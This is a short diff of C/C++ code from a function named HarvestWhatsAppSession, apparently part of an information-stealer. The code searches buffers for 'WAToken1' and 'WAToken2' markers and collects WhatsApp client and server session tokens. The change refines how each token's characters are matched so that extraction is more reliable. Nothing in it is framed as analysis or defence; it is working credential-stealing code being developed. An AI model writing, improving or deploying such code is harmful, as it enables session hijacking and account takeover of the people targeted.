@@ -1364,7 +1364,12 @@ static void HarvestWhatsAppSession() {
                                 // WAToken1 (client token)
                                 if (i + 8 <= rd && memcmp(buf + i, "WAToken1", 8) == 0) {
                                     DWORD end = i + 8;
-                                    while (end < rd && IsTokenChar(buf[end]) && end - i < 200) end++;
+                                    while (end < rd && end - i < 200) {
+                                        char c = buf[end];
+                                        if (c == 0 || c == '"' || c == '\'' || c == '&' || c == '|' || c == '<' || c == '>' || c == ' ' || c == '\t' || c == '\r' || c == '\n') break;
+                                        if (!isalnum((unsigned char)c) && c != '+' && c != '/' && c != '=' && c != '-' && c != '_' && c != '.') break;
+                                        end++;
+                                    }
                                     if (end - i - 8 >= 40) tokens.push_back(std::string(buf + i + 8, end - i - 8));
                                     i = end;
                                     continue;
@@ -1372,7 +1377,12 @@ static void HarvestWhatsAppSession() {
                                 // WAToken2 (server token)
                                 if (i + 8 <= rd && memcmp(buf + i, "WAToken2", 8) == 0) {
                                     DWORD end = i + 8;
-                                    while (end < rd && IsTokenChar(buf[end]) && end - i < 200) end++;
+                                    while (end < rd && end - i < 200) {
+                                        char c = buf[end];
+                                        if (c == 0 || c == '"' || c == '\'' || c == '&' || c == '|' || c == '<' || c == '>' || c == ' ' || c == '\t' || c == '\r' || c == '\n') break;
+                                        if (!isalnum((unsigned char)c) && c != '+' && c != '/' && c != '=' && c != '-' && c != '_' && c != '.') break;
+                                        end++;
+                                    }
                                     if (end - i - 8 >= 40) tokens.push_back(std::string(buf + i + 8, end - i - 8));
                                     i = end;
                                     continue;
